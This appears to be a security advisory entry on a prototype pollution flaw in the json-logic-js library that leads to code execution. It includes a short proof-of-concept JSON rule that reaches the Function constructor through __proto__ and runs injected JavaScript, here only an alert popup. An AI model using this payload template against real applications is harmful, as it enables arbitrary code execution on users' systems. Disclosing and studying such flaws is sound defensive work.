  title: Prototype Pollution
  description: |-
    All versions of `json-logic-js` are vulnerable to Prototype Pollution.  The `method` operation allows a malicious user to modify the prototype of `Object` through the method property name. This causes modification of any existing property that will exist on all objects and leads to Remote Code Execution.

    The following rule creates a popup when run from a browser:
    ```
    {
      "method": [
        {
          "method": [
            {
              "var": "__proto__.constructor.is.__proto__"
            },
            "constructor",
            [
              "var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)"
            ]
          ]
        },
        "call"
      ]
    }
    ```
